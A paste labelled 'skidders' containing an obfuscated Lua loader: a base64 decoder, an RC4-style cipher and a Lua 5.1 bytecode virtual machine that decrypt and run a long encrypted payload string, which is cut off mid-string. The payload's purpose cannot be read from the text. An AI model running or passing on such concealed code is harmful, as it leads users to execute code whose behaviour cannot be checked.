
skidders

return (function()local karrotlIIIIlIl = "\107\97\114\114\111\116\32\102\114\101\101\32\111\98\102\117\115\99\97\116\105\111\110";local karrotlIIIIlIl = "\107\97\114\114\111\116\32\102\114\101\101\32\111\98\102\117\115\99\97\116\105\111\110";local karrotlIIIIlIl = "\107\97\114\114\111\116\32\102\114\101\101\32\111\98\102\117\115\99\97\116\105\111\110";local karrotlIIllllI=269;local karrotlIIlllIl=138;local karrotlIIlllII=3;local karrotlIIlIllI=function(a)local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';a=string.gsub(a,'[^'..b..'=]','')return a:gsub('.',function(c)if c=='='then return''end;local d,e='',b:find(c)-1;for f=6,1,-1 do d=d..(e%2^f-e%2^(f-1)>0 and'1'or'0')end;return d end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(c)if#c~=8 then return''end;local g=0;for f=1,8 do g=g+(c:sub(f,f)=='1'and 2^(8-f)or 0)end;return string.char(g)end)end;local karrotlIIlllIl=290;local karrotlIIlIlIl=(function()local function a(b)local c={}for d=0,255 do c[d]={}end;c[0][0]=b[1]*255;local e=1;for f=0,7 do for d=0,e-1 do for g=0,e-1 do local h=c[d][g]-b[1]*e;c[d][g+e]=h+b[2]*e;c[d+e][g]=h+b[3]*e;c[d+e][g+e]=h+b[4]*e end end;e=e*2 end;return c end;local i=a{0,1,1,0}local function j(self,k)local l,d,g=self.S,self.i,self.j;local m={}local n=string.char;for o=1,k do d=(d+1)%256;g=(g+l[d])%256;l[d],l[g]=l[g],l[d]m[o]=n(l[(l[d]+l[g])%256])end;self.i,self.j=d,g;return table.concat(m)end;local function p(self,q)local r=j(self,#q)local s={}local t=string.byte;local n=string.char;for d=1,#q do s[d]=n(i[t(q,d)][t(r,d)])end;return table.concat(s)end;local function u(self,v)local l=self.S;local g,w=0,#v;local t=string.byte;for d=0,255 do g=(g+l[d]+t(v,d%w+1))%256;l[d],l[g]=l[g],l[d]end end;function new(v)local l={}local s={S=l,i=0,j=0,generate=j,cipher=p,schedule=u}for d=0,255 do l[d]=d end;if v then s:schedule(v)end;return s end;return new end)();local fev=getfenv or function()return _ENV end;local karrotlIIlIlII=(function()if not bit then local bit_=nil pcall(function()bit_=require('bit') end)bit=bit_ end local bit=bit or bit32 or(function()local a={_TYPE='module',_NAME='bit.numberlua',_VERSION='0.3.1.20120131'}local b=math.floor;local c=2^32;local d=c-1;local function e(f)local g={}local h=setmetatable({},g)function g:__index(i)local j=f(i)h[i]=j;return j end;return h end;local function k(h,l)local function m(n,o)local p,q=0,1;while n~=0 and o~=0 do local r,s=n%l,o%l;p=p+h[r][s]*q;n=(n-r)/l;o=(o-s)/l;q=q*l end;p=p+(n+o)*q;return p end;return m end;local function t(h)local u=k(h,2^1)local v=e(function(n)return e(function(o)return u(n,o)end)end)return k(v,2^(h.n or 1))end;function a.tobit(w)return w%2^32 end;a.bxor=t{[0]={[0]=0,[1]=1},[1]={[0]=1,[1]=0},n=4}local x=a.bxor;function a.bnot(n)return d-n end;local y=a.bnot;function a.band(n,o)return(n+o-x(n,o))/2 end;local z=a.band;function a.bor(n,o)return d-z(d-n,d-o)end;local A=a.bor;local B,C;function a.rshift(n,D)if D<0 then return B(n,-D)end;return b(n%2^32/2^D)end;C=a.rshift;function a.lshift(n,D)if D<0 then return C(n,-D)end;return n*2^D%2^32 end;B=a.lshift;function a.tohex(w,E)E=E or 8;local F;if E<=0 then if E==0 then return''end;F=true;E=-E end;w=z(w,16^E-1)return('%0'..E..(F and'X'or'x')):format(w)end;local G=a.tohex;function a.extract(E,H,I)I=I or 1;return z(C(E,H),2^I-1)end;local J=a.extract;function a.replace(E,j,H,I)I=I or 1;local K=2^I-1;j=z(j,K)local L=y(B(K,H))return z(E,L)+B(j,H)end;local M=a.replace;function a.bswap(w)local n=z(w,0xff)w=C(w,8)local o=z(w,0xff)w=C(w,8)local N=z(w,0xff)w=C(w,8)local O=z(w,0xff)return B(B(B(n,8)+o,8)+N,8)+O end;local P=a.bswap;function a.rrotate(w,D)D=D%32;local Q=z(w,2^D-1)return C(w,D)+B(Q,32-D)end;local R=a.rrotate;function a.lrotate(w,D)return R(w,-D)end;local S=a.lrotate;a.rol=a.lrotate;a.ror=a.rrotate;function a.arshift(w,D)local T=C(w,D)if w>=0x80000000 then T=T+B(2^D-1,32-D)end;return T end;local U=a.arshift;function a.btest(w,V)return z(w,V)~=0 end;a.bit32={}local function W(w)return(-1-w)%c end;a.bit32.bnot=W;local function X(n,o,N,...)local T;if o then n=n%c;o=o%c;T=x(n,o)if N then T=X(T,N,...)end;return T elseif n then return n%c else return 0 end end;a.bit32.bxor=X;local function Y(n,o,N,...)local T;if o then n=n%c;o=o%c;T=(n+o-x(n,o))/2;if N then T=Y(T,N,...)end;return T elseif n then return n%c else return d end end;a.bit32.band=Y;local function Z(n,o,N,...)local T;if o then n=n%c;o=o%c;T=d-z(d-n,d-o)if N then T=Z(T,N,...)end;return T elseif n then return n%c else return 0 end end;a.bit32.bor=Z;function a.bit32.btest(...)return Y(...)~=0 end;function a.bit32.lrotate(w,D)return S(w%c,D)end;function a.bit32.rrotate(w,D)return R(w%c,D)end;function a.bit32.lshift(w,D)if D>31 or D<-31 then return 0 end;return B(w%c,D)end;function a.bit32.rshift(w,D)if D>31 or D<-31 then return 0 end;return C(w%c,D)end;function a.bit32.arshift(w,D)w=w%c;if D>=0 then if D>31 then return w>=0x80000000 and d or 0 else local T=C(w,D)if w>=0x80000000 then T=T+B(2^D-1,32-D)end;return T end else return B(w,-D)end end;function a.bit32.extract(w,H,...)local I=...or 1;if H<0 or H>31 or I<0 or H+I>32 then error'out of range'end;w=w%c;return J(w,H,...)end;function a.bit32.replace(w,j,H,...)local I=...or 1;if H<0 or H>31 or I<0 or H+I>32 then error'out of range'end;w=w%c;j=j%c;return M(w,j,H,...)end;a.bit={}function a.bit.tobit(w)w=w%c;if w>=0x80000000 then w=w-c end;return w end;local _=a.bit.tobit;function a.bit.tohex(w,...)return G(w%c,...)end;function a.bit.bnot(w)return _(y(w%c))end;local function a0(n,o,N,...)if N then return a0(a0(n,o),N,...)elseif o then return _(A(n%c,o%c))else return _(n)end end;a.bit.bor=a0;local function a1(n,o,N,...)if N then return a1(a1(n,o),N,...)elseif o then return _(z(n%c,o%c))else return _(n)end end;a.bit.band=a1;local function a2(n,o,N,...)if N then return a2(a2(n,o),N,...)elseif o then return _(x(n%c,o%c))else return _(n)end end;a.bit.bxor=a2;function a.bit.lshift(w,E)return _(B(w%c,E%32))end;function a.bit.rshift(w,E)return _(C(w%c,E%32))end;function a.bit.arshift(w,E)return _(U(w%c,E%32))end;function a.bit.rol(w,E)return _(S(w%c,E%32))end;function a.bit.ror(w,E)return _(R(w%c,E%32))end;function a.bit.bswap(w)return _(P(w%c))end;return a end)()local unpack=table.unpack or unpack;local a3;local a4;local a5;local a6=50;local a7={[22]=18,[31]=8,[33]=28,[0]=3,[1]=13,[2]=23,[26]=33,[12]=1,[13]=6,[14]=10,[15]=16,[16]=20,[17]=26,[18]=30,[19]=36,[3]=0,[4]=2,[5]=4,[6]=7,[7]=9,[8]=12,[9]=14,[10]=17,[20]=19,[21]=22,[23]=24,[24]=27,[25]=29,[27]=32,[32]=34,[34]=37,[11]=5,[28]=11,[29]=15,[30]=21,[35]=25,[36]=31,[37]=35}local a8={[0]='ABC','ABx','ABC','ABC','ABC','ABx','ABC','ABx','ABC','ABC','ABC','ABC','ABC','ABC','ABC','ABC','ABC','ABC','ABC','ABC','ABC','ABC','AsBx','ABC','ABC','ABC','ABC','ABC','ABC','ABC','ABC','AsBx','AsBx','ABC','ABC','ABC','ABx','ABC'}local a9={[0]={b='OpArgR',c='OpArgN'},{b='OpArgK',c='OpArgN'},{b='OpArgU',c='OpArgU'},{b='OpArgR',c='OpArgN'},{b='OpArgU',c='OpArgN'},{b='OpArgK',c='OpArgN'},{b='OpArgR',c='OpArgK'},{b='OpArgK',c='OpArgN'},{b='OpArgU',c='OpArgN'},{b='OpArgK',c='OpArgK'},{b='OpArgU',c='OpArgU'},{b='OpArgR',c='OpArgK'},{b='OpArgK',c='OpArgK'},{b='OpArgK',c='OpArgK'},{b='OpArgK',c='OpArgK'},{b='OpArgK',c='OpArgK'},{b='OpArgK',c='OpArgK'},{b='OpArgK',c='OpArgK'},{b='OpArgR',c='OpArgN'},{b='OpArgR',c='OpArgN'},{b='OpArgR',c='OpArgN'},{b='OpArgR',c='OpArgR'},{b='OpArgR',c='OpArgN'},{b='OpArgK',c='OpArgK'},{b='OpArgK',c='OpArgK'},{b='OpArgK',c='OpArgK'},{b='OpArgR',c='OpArgU'},{b='OpArgR',c='OpArgU'},{b='OpArgU',c='OpArgU'},{b='OpArgU',c='OpArgU'},{b='OpArgU',c='OpArgN'},{b='OpArgR',c='OpArgN'},{b='OpArgR',c='OpArgN'},{b='OpArgN',c='OpArgU'},{b='OpArgU',c='OpArgU'},{b='OpArgN',c='OpArgN'},{b='OpArgU',c='OpArgN'},{b='OpArgU',c='OpArgN'}}local function aa(ab,s,e,d)local ac=0;for i=s,e,d do ac=ac+string.byte(ab,i,i)*256^(i-s)end;return ac end;local function ad(ae,af,ag,ah)local ai=(-1)^bit.rshift(ah,7)local aj=bit.rshift(ag,7)+bit.lshift(bit.band(ah,0x7F),1)local ak=ae+bit.lshift(af,8)+bit.lshift(bit.band(ag,0x7F),16)local al=1;if aj==0 then if ak==0 then return ai*0 else al=0;aj=1 end elseif aj==0x7F then if ak==0 then return ai*1/0 else return ai*0/0 end end;return ai*2^(aj-127)*(1+al/2^23)end;local function am(ae,af,ag,ah,an,ao,ap,aq)local ai=(-1)^bit.rshift(aq,7)local aj=bit.lshift(bit.band(aq,0x7F),4)+bit.rshift(ap,4)local ak=bit.band(ap,0x0F)*2^48;local al=1;ak=ak+ao*2^40+an*2^32+ah*2^24+ag*2^16+af*2^8+ae;if aj==0 then if ak==0 then return ai*0 else al=0;aj=1 end elseif aj==0x7FF then if ak==0 then return ai*1/0 else return ai*0/0 end end;return ai*2^(aj-1023)*(al+ak/2^52)end;local function ar(ab,s,e)return aa(ab,s,e-1,1)end;local function as(ab,s,e)return aa(ab,e-1,s,-1)end;local function at(ab,s)return ad(string.byte(ab,s,s+3))end;local function au(ab,s)local ae,af,ag,ah=string.byte(ab,s,s+3)return ad(ah,ag,af,ae)end;local function av(ab,s)return am(string.byte(ab,s,s+7))end;local function aw(ab,s)local ae,af,ag,ah,an,ao,ap,aq=string.byte(ab,s,s+7)return am(aq,ap,ao,an,ah,ag,af,ae)end;local ax={[4]={little=at,big=au},[8]={little=av,big=aw}}local function ay(S)local az=S.index;local aA=string.byte(S.source,az,az)S.index=az+1;return aA end;local function aB(S,aC)local aD=S.index+aC;local aE=string.sub(S.source,S.index,aD-1)S.index=aD;return aE end;local function aF(S)local aC=S:s_szt()local aE;if aC~=0 then aE=string.sub(aB(S,aC),1,-2)end;return aE end;local function aG(aC,aH)return function(S)local aD=S.index+aC;local aI=aH(S.source,S.index,aD)S.index=aD;return aI end end;local function aJ(aC,aH)return function(S)local aK=aH(S.source,S.index)S.index=S.index+aC;return aK end end;local function aL(S)local aM=S:s_int()local aN={}for i=1,aM do local aO=S:s_ins()local aP=bit.band(aO,0x3F)local aQ=a8[aP]local aR=a9[aP]local aS={value=aO,op=a7[aP],A=bit.band(bit.rshift(aO,6),0xFF)}if aQ=='ABC'then aS.B=bit.band(bit.rshift(aO,23),0x1FF)aS.C=bit.band(bit.rshift(aO,14),0x1FF)aS.is_KB=aR.b=='OpArgK'and aS.B>0xFF;aS.is_KC=aR.c=='OpArgK'and aS.C>0xFF elseif aQ=='ABx'then aS.Bx=bit.band(bit.rshift(aO,14),0x3FFFF)aS.is_K=aR.b=='OpArgK'elseif aQ=='AsBx'then aS.sBx=bit.band(bit.rshift(aO,14),0x3FFFF)-131071 end;aN[i]=aS end;return aN end;local function aT(S)local aM=S:s_int()local aU={}for i=1,aM do local aV=ay(S)local k;if aV==1 then k=ay(S)~=0 elseif aV==3 then k=S:s_num()elseif aV==4 then k=aF(S)end;aU[i]=k end;return aU end;local function aW(S,ab)local aM=S:s_int()local aX={}for i=1,aM do aX[i]=a5(S,ab)end;return aX end;local function aY(S)local aM=S:s_int()local aZ={}for i=1,aM do aZ[i]=S:s_int()end;return aZ end;local function a_(S)local aM=S:s_int()local b0={}for i=1,aM do b0[i]={varname=aF(S),startpc=S:s_int(),endpc=S:s_int()}end;return b0 end;local function b1(S)local aM=S:s_int()local b2={}for i=1,aM do b2[i]=aF(S)end;return b2 end;function a5(S,b3)local b4={}local ab=aF(S)or b3;b4.source=ab;S:s_int()S:s_int()b4.numupvals=ay(S)b4.numparams=ay(S)ay(S)ay(S)b4.code=aL(S)b4.const=aT(S)b4.subs=aW(S,ab)b4.lines=aY(S)a_(S)b1(S)for _,v in ipairs(b4.code)do if v.is_K then v.const=b4.const[v.Bx+1]else if v.is_KB then v.const_B=b4.const[v.B-0xFF]end;if v.is_KC then v.const_C=b4.const[v.C-0xFF]end end end;return b4 end;function a3(ab)local b5;local b6;local b7;local b8;local b9;local ba;local bb;local bc={index=1,source=ab}assert(aB(bc,4)=='\27Lua','invalid Lua signature')assert(ay(bc)==0x51,'invalid Lua version')assert(ay(bc)==0,'invalid Lua format')b6=ay(bc)~=0;b7=ay(bc)b8=ay(bc)b9=ay(bc)ba=ay(bc)bb=ay(bc)~=0;b5=b6 and ar or as;bc.s_int=aG(b7,b5)bc.s_szt=aG(b8,b5)bc.s_ins=aG(b9,b5)if bb then bc.s_num=aG(ba,b5)elseif ax[ba]then bc.s_num=aJ(ba,ax[ba][b6 and'little'or'big'])else error('unsupported float size')end;return a5(bc,'@virtual')end;local function bd(be,bf)for i,bg in pairs(be)do if bg.index>=bf then bg.value=bg.store[bg.index]bg.store=bg;bg.index='value'be[i]=nil end end end;local function bh(be,bf,bi)local bj=be[bf]if not bj then bj={index=bf,store=bi}be[bf]=bj end;return bj end;local function bk(...)return select('#',...),{...}end;local function bl(bm,bn)local ab=bm.source;local bo=bm.lines[bm.pc-1]local b3,bp,bq=string.match(bn,'^(.-):(%d+):%s+(.+)')local br='%s:%i: [%s:%i] %s'bo=bo or'0'b3=b3 or'?'bp=bp or'0'bq=bq or bn;error(string.format(br,ab,bo,b3,bp,bq),0)end;local function bs(bm)local aN=bm.code;local bt=bm.subs;local bu=bm.env;local bv=bm.upvals;local bw=bm.varargs;local bx=-1;local by={}local bi=bm.stack;local bz=bm.pc;while true do local bA=aN[bz]local aP=bA.op;bz=bz+1;if aP<18 then if aP<8 then if aP<3 then if aP<1 then for i=bA.A,bA.B do bi[i]=nil end elseif aP>1 then local bg=bv[bA.B]bi[bA.A]=bg.store[bg.index]else local bB,bC;if bA.is_KB then bB=bA.const_B else bB=bi[bA.B]end;if bA.is_KC then bC=bA.const_C else bC=bi[bA.C]end;bi[bA.A]=bB+bC end elseif aP>3 then if aP<6 then if aP>4 then local A=bA.A;local B=bA.B;local bf;if bA.is_KC then bf=bA.const_C else bf=bi[bA.C]end;bi[A+1]=bi[B]bi[A]=bi[B][bf]else bi[bA.A]=bu[bA.const]end elseif aP>6 then local bf;if bA.is_KC then bf=bA.const_C else bf=bi[bA.C]end;bi[bA.A]=bi[bA.B][bf]else local bB,bC;if bA.is_KB then bB=bA.const_B else bB=bi[bA.B]end;if bA.is_KC then bC=bA.const_C else bC=bi[bA.C]end;bi[bA.A]=bB-bC end else bi[bA.A]=bi[bA.B]end elseif aP>8 then if aP<13 then if aP<10 then bu[bA.const]=bi[bA.A]elseif aP>10 then if aP<12 then local A=bA.A;local B=bA.B;local C=bA.C;local bD;local bE,bF;if B==0 then bD=bx-A else bD=B-1 end;bE,bF=bk(bi[A](unpack(bi,A+1,A+bD)))if C==0 then bx=A+bE-1 else bE=C-1 end;for i=1,bE do bi[A+i-1]=bF[i]end else local bg=bv[bA.B]bg.store[bg.index]=bi[bA.A]end else local bB,bC;if bA.is_KB then bB=bA.const_B else bB=bi[bA.B]end;if bA.is_KC then bC=bA.const_C else bC=bi[bA.C]end;bi[bA.A]=bB*bC end elseif aP>13 then if aP<16 then if aP>14 then local A=bA.A;local B=bA.B;local bD;if B==0 then bD=bx-A else bD=B-1 end;bd(by,0)return bk(bi[A](unpack(bi,A+1,A+bD)))else local bf,bG;if bA.is_KB then bf=bA.const_B else bf=bi[bA.B]end;if bA.is_KC then bG=bA.const_C else bG=bi[bA.C]end;bi[bA.A][bf]=bG end elseif aP>16 then bi[bA.A]={}else local bB,bC;if bA.is_KB then bB=bA.const_B else bB=bi[bA.B]end;if bA.is_KC then bC=bA.const_C else bC=bi[bA.C]end;bi[bA.A]=bB/bC end else bi[bA.A]=bA.const end else local A=bA.A;local bH=bi[A+2]local bf=bi[A]+bH;local bI=bi[A+1]local bJ;if bH==math.abs(bH)then bJ=bf<=bI else bJ=bf>=bI end;if bJ then bi[bA.A]=bf;bi[bA.A+3]=bf;bz=bz+bA.sBx end end elseif aP>18 then if aP<28 then if aP<23 then if aP<20 then bi[bA.A]=#bi[bA.B]elseif aP>20 then if aP<22 then local A=bA.A;local B=bA.B;local bK={}local aM;if B==0 then aM=bx-A+1 else aM=B-1 end;for i=1,aM do bK[i]=bi[A+i-1]end;bd(by,0)return aM,bK else local aE=bi[bA.B]for i=bA.B+1,bA.C do aE=aE..bi[i]end;bi[bA.A]=aE end else local bB,bC;if bA.is_KB then bB=bA.const_B else bB=bi[bA.B]end;if bA.is_KC then bC=bA.const_C else bC=bi[bA.C]end;bi[bA.A]=bB%bC end elseif aP>23 then if aP<26 then if aP>24 then bd(by,bA.A)else local bB,bC;if bA.is_KB then bB=bA.const_B else bB=bi[bA.B]end;if bA.is_KC then bC=bA.const_C else bC=bi[bA.C]end;if bB==bC==(bA.A~=0)then bz=bz+aN[bz].sBx end;bz=bz+1 end elseif aP>26 then local bB,bC;if bA.is_KB then bB=bA.const_B else bB=bi[bA.B]end;if bA.is_KC then bC=bA.const_C else bC=bi[bA.C]end;if bB<bC==(bA.A~=0)then bz=bz+aN[bz].sBx end;bz=bz+1 else local bB,bC;if bA.is_KB then bB=bA.const_B else bB=bi[bA.B]end;if bA.is_KC then bC=bA.const_C else bC=bi[bA.C]end;bi[bA.A]=bB^bC end else bi[bA.A]=bA.B~=0;if bA.C~=0 then bz=bz+1 end end elseif aP>28 then if aP<33 then if aP<30 then local bB,bC;if bA.is_KB then bB=bA.const_B else bB=bi[bA.B]end;if bA.is_KC then bC=bA.const_C else bC=bi[bA.C]end;if bB<=bC==(bA.A~=0)then bz=bz+aN[bz].sBx end;bz=bz+1 elseif aP>30 then if aP<32 then local aX=bt[bA.Bx+1]local bL=aX.numupvals;local bM;if bL~=0 then bM={}for i=1,bL do local bN=aN[bz+i-1]if bN.op==a7[0]then bM[i-1]=bh(by,bN.B,bi)elseif bN.op==a7[4]then bM[i-1]=bv[bN.B]end end;bz=bz+bL end;bi[bA.A]=a4(aX,bu,bM)else local A=bA.A;local B=bA.B;if not bi[B]==(bA.C~=0)then bz=bz+1 else bi[A]=bi[B]end end else bi[bA.A]=-bi[bA.B]end elseif aP>33 then if aP<36 then if aP>34 then local A=bA.A;local aM=bA.B;if aM==0 then aM=bw.size;bx=A+aM-1 end;for i=1,aM do bi[A+i-1]=bw.list[i]end else local A=bA.A;local bO,bI,bH;bO=assert(tonumber(bi[A]),'`for` initial value must be a number')bI=assert(tonumber(bi[A+1]),'`for` limit must be a number')bH=assert(tonumber(bi[A+2]),'`for` step must be a number')bi[A]=bO-bH;bi[A+1]=bI;bi[A+2]=bH;bz=bz+bA.sBx end elseif aP>36 then local A=bA.A;local C=bA.C;local aM=bA.B;local bP=bi[A]local bQ;if aM==0 then aM=bx-A end;if C==0 then C=bA[bz].value;bz=bz+1 end;bQ=(C-1)*a6;for i=1,aM do bP[i+bQ]=bi[A+i]end else bi[bA.A]=not bi[bA.B]end else if not bi[bA.A]==(bA.C~=0)then bz=bz+1 end end else local A=bA.A;local aH=bi[A]local bR=bi[A+1]local bf=bi[A+2]local bS=A+3;local bK;bi[bS+2]=bf;bi[bS+1]=bR;bi[bS]=aH;bK={aH(bR,bf)}for i=1,bA.C do bi[bS+i-1]=bK[i]end;if bi[bS]~=nil then bi[A+2]=bi[bS]else bz=bz+1 end end else bz=bz+bA.sBx end;bm.pc=bz end end;function a4(bR,bu,b2)local bT=bR.code;local bU=bR.subs;local bV=bR.lines;local bW=bR.source;local bX=bR.numparams;local function bY(...)local bi={}local bZ={}local b_=0;local c0,c1=bk(...)local bm;local c2,bn,bK;for i=1,bX do bi[i-1]=c1[i]end;if bX<c0 then b_=c0-bX;for i=1,b_ do bZ[i]=c1[bX+i]end end;bm={varargs={list=bZ,size=b_},code=bT,subs=bU,lines=bV,source=bW,env=bu,upvals=b2,stack=bi,pc=1}c2,bn,bK=pcall(bs,bm,...)if c2 then return unpack(bK,1,bn)else bl(bm,bn)end;return end;return bY end;return function(c3,bu)return a4(a3(c3),bu or fev(0))end end)();local karrotlIIllIIl='\107\97\114\114\111\116\32\102\114\101\101\32\111\98\102\117\115\99\97\116\105\111\110';local karrotlIIlIIIl="\104\78\90\56\110\71\120\101\74\113\78\48\106\80\111\57\112\54\118\86\47\74\73\69\106\115\55\72\101\88\47\51\102\72\66\71\88\119\116\99\48\98\50\47\47\80\104\87\104\66\101\118\66\72\70\85\109\112\110\80\108\86\87\106\101\73\66\103\43\110\48\120\99\109\47\121\67\104\83\108\108\78\85\86\89\76\51\106\101\66\70\70\87\88\68\84\52\102\79\80\48\118\71\109\110\71\88\85\122\47\87\103\50\109\121\52\102\86\51\82\54\112\84\101\73\55\56\48\47\81\104\54\120\76\67\77\122\43\80\74\72\79\116\99\70\109\56\112\109\120\88\80\55\74\89\118\50\104\56\104\73\115\75\71\51\74\68\69\108\104\72\78\80\99\101\108\104\106\50\52\72\72\66\110\122\49\109\113\79\56\65\80\103\102\122\74\90\54\43\65\69\99\109\82\81\66\108\119\122\104\56\105\76\89\81\100\110\76\48\71\112\109\121\86\43\98\82\101\77\55\73\100\117\75\75\48\121\118\97\70\86\113\99\49\77\70\48\78\86\72\119\79\121\97\86\65\118\78\100\74\54\110\110\85\112\67\56\115\48\76\90\73\101\118\108\49\121\107\119\66\53\105\74\115\83\56\107\105\77\81\74\83\72\114\52\43\54\66\81\122\98\121\85\109\74\109\78\109\79\55\89\104\111\120\66\52\110\52\107\68\120\43\114\121\117\70\67\87\70\65\50\88\54\121\48\72\47\99\111\56\66\116\70\52\120\71\77\89\83\48\83\73\115\87\49\118\110\53\49\81\48\47\110\101\88\79\108\51\54\122\69\55\71\68\56\105\121\89\115\51\105\109\57\48\109\51\51\47\49\56\54\79\88\66\101\75\88\87\113\48\83\100\101\76\80\73\118\55\78\43\117\114\103\73\116\85\107\100\103\57\49\52\52\47\73\47\112\114\117\48\50\79\121\88\47\71\47\65\88\71\72\97\110\118\121\50\89\106\114\77\80\100\99\47\50\102\81\69\51\77\108\51\87\89\118\110\106\57\72\113\87\50\48\89\47\75\118\52\66\121\103\101\53\54\79\48\118\120\87\79\76\69\109\85\115\122\84\105\115\80\116\71\51\43\51\115\121\43\65\54\47\122\116\113\118\67\104\110\101\116\113\81\71\108\83\117\86\83\69\99\109\121\120\119\51\57\119\120\54\107\49\76\76\57\100\115\53\105\85\47\107\70\77\69\103\53\66\97\70\121\87\51\84\84\70\43\105\78\102\111\108\75\50\103\52\79\55\121\122\72\71\83\69\102\103\69\90\51\116\55\85\73\66\71\50\53\106\54\55\101\47\98\122\43\119\100\110\120\103\65\67\67\99\67\68\89\67\77\77\118\50\54\72\66\111\111\80\57\56\84\67\43\119\87\112\84\104\54\53\47\103\80\113\81\104\121\68\47\76\111\105\49\79\75\102\56\82\100\104\49\99\97\76\102\78\116\113\101\76\115\77\79\102\57\90\49\57\49\69\112\89\65\73\116\116\81\84\55\102\48\106\113\68\78\120\72\112\115\77\77\83\72\83\48\48\106\104\106\68\76\71\115\122\116\47\65\104\89\77\89\112\119\83\75\87\67\116\79\106\107\103\98\116\77\48\121\84\77\80\72\99\102\68\104\90\104\72\80\120\52\75\74\66\84\101\111\103\102\104\104\116\122\104\66\118\83\101\50\79\76\80\103\67\109\116\97\105\103\77\68\84\105\110\106\115\65\57\100\50\65\116\53\101\89\109\119\57\97\84\49\111\98\100\79\88\103\53\89\87\87\49\74\116\73\99\66\120\66\75\113\103\88\73\75\70\108\76\110\47\120\110\56\79\55\86\101\87\69\52\102\102\51\122\104\51\74\108\100\116\109\113\112\119\77\52\77\52\82\65\115\65\74\52\55\105\121\105\113\105\68\88\67\71\48\100\102\84\109\105\115\85\75\121\117\57\107\82\49\109\77\110\65\55\82\55\72\106\53\78\78\67\88\83\54\115\71\98\78\54\115\82\71\108\78\76\83\121\74\85\55\53\83\74\70\47\43\54\104\88\50\53\88\52\108\49\52\69\115\43\55\87\76\65\52\107\83\56\117\105\117\85\106\51\98\121\112\116\68\105\66\97\102\109\86\121\81\118\115\50\101\117\65\65\53\78\79\101\115\110\106\89\98\66\67\104\118\117\48\122\88\56\98\122\84\104\71\54\104\121\103\88\48\78\86\116\102\86\101\57\101\120\68\54\43\115\81\111\48\66\105\43\52\69\49\84\71\120\79\52\111\49\100\57\78\104\100\51\74\115\72\112\55\117\108\67\113\79\51\111\70\118\112\54\109\50\51\82\86\119\106\119\89\115\98\114\89\100\121\71\98\78\115\70\108\117\119\89\77\82\103\73\120\75\97\114\73\67\73\55\120\88\90\66\51\105\117\116\51\82\86\89\100\69\119\102\110\53\73\51\56\120\89\70\71\87\51\66\75\108\53\111\77\107\97\87\66\55\115\51\121\70\47\85\120\118\85\72\87\113\56\90\50\78\57\83\76\49\104\86\79\121\50\120\105\101\99\81\51\67\104\52\78\49\73\52\84\79\48\77\98\90\98\87\112\116\81\70\115\84\54\122\51\89\122\81\89\52\89\75\80\80\71\81\73\121\54\89\51\110\99\56\70\51\103\82\51\103\122\109\81\99\118\120\82\90\68\86\111\104\104\65\97\51\111\81\105\79\74\72\74\49\79\88\76\121\122\109\53\88\51\57\74\104\72\51\54\86\117\55\74\100\120\56\103\54\119\106\90\78\88\43\87\107\106\112\119\105\114\56\111\110\50\48\86\53\116\109\110\105\69\117\47\107\88\102\107\76\117\65\117\71\54\113\73\90\49\120\53\104\119\50\53\49\105\77\119\66\117\109\122\100\87\111\116\69\52\75\43\83\78\71\66\43\76\110\50\118\108\82\101\82\67\120\76\98\104\107\83\77\109\80\109\66\68\80\50\87\89\116\75\87\65\87\111\118\65\86\109\122\101\106\82\85\99\84\86\48\74\87\70\57\121\116\71\90\120\48\86\90\105\43\106\52\79\47\55\104\86\88\86\65\117\108\48\118\108\113\90\51\55\103\101\68\107\71\87\70\48\67\115\118\87\98\104\107\122\103\112\69\50\48\67\71\118\48\119\80\119\47\81\83\67\117\51\84\56\79\110\89\113\78\90\103\76\105\121\54\72\90\113\67\50\43\98\112\100\76\68\117\55\112\52\112\98\49\77\81\77\72\122\103\110\84\52\69\49\116\114\52\88\70\56\107\74\110\88\114\71\106\84\74\112\119\43\85\43\116\79\107\71\107\108\101\81\75\97\114\48\71\84\43\66\70\67\114\117\72\75\72\55\102\43\66\117\113\84\111\66\66\73\100\119\49\103\72\110\47\55\53\117\51\119\116\109\84\119\50\71\109\52\97\77\118\112\65\104\65\54\122\87\49\69\101\65\105\106\102\57\80\48\79\120\55\120\76\43\119\113\53\49\89\48\55\48\73\116\102\87\43\52\75\77\117\76\55\66\75\55\97\120\79\113\49\89\53\70\109\122\54\109\82\118\74\117\83\84\72\108\108\75\66\117\103\115\90\72\114\71\86\76\121\67\57\97\74\53\47\79\116\107\109\71\68\57\75\98\81\107\98\79\79\89\122\72\49\119\80\52\121\82\83\74\66\75\90\56\98\86\52\117\87\102\54\67\113\101\80\48\75\50\85\118\47\118\113\65\118\67\83\83\122\122\88\72\100\43\43\86\72\89\43\83\80\70\102\119\82\73\111\74\112\81\66\74\65\114\79\71\97\80\70\89\79\66\105\55\71\77\56\73\107\99\77\119\47\51\118\106\79\84\118\99\57\117\55\122\115\108\72\80\68\54\84\81\103\113\97\74\55\67\86\89\52\88\85\52\105\102\75\56\113\104\103\120\101\67\88\66\98\110\82\48\117\114\113\67\74\103\47\121\51\65\81\79\67\100\106\74\66\105\77\103\57\78\112\122\79\49\114\54\79\52\121\104\81\113\51\97\101\79\107\114\76\102\120\69\105\53\49\119\114\117\51\73\112\113\78\77\109\66\79\107\90\56\113\73\88\110\67\80\100\51\118\116\109\117\118\74\48\102\47\110\113\75\121\52\68\108\43\112\54\49\80\108\50\121\116\65\80\110\104\116\43\67\89\78\82\70\104\69\90\88\89\108\67\68\72\106\101\88\121\100\115\98\85\106\120\53\56\77\108\48\109\85\56\50\112\121\104\56\109\114\105\101\102\97\47\109\56\106\76\82\112\85\100\100\83\52\121\43\97\115\105\78\85\53\81\97\80\66\121\104\43\57\78\99\90\81\79\107\43\86\77\110\114\52\56\79\69\86\88\115\47\50\55\83\49\74\107\117\106\117\99\84\113\57\86\110\53\71\114\68\47\87\54\99\85\103\117\74\51\53\85\85\56\85\52\108\105\53\102\109\67\100\114\122\66\105\82\80\56\84\120\80\67\97\107\85\52\74\119\116\80\53\74\108\103\48\110\79\113\98\53\82\104\54\74\116\55\50\97\116\53\101\57\86\114\88\75\53\109\87\90\107\90\82\121\68\116\71\69\117\71\56\117\109\49\102\65\65\84\103\120\73\110\43\57\68\115\67\55\73\74\65\104\97\89\70\49\120\54\117\120\78\121\57\121\77\102\107\110\118\106\48\119\113\98\119\77\82\122\108\85\76\70\108\79\98\43\55\75\74\47\118\106\87\52\47\50\84\74\101\56\53\76\107\87\112\85\107\48\122\87\53\87\98\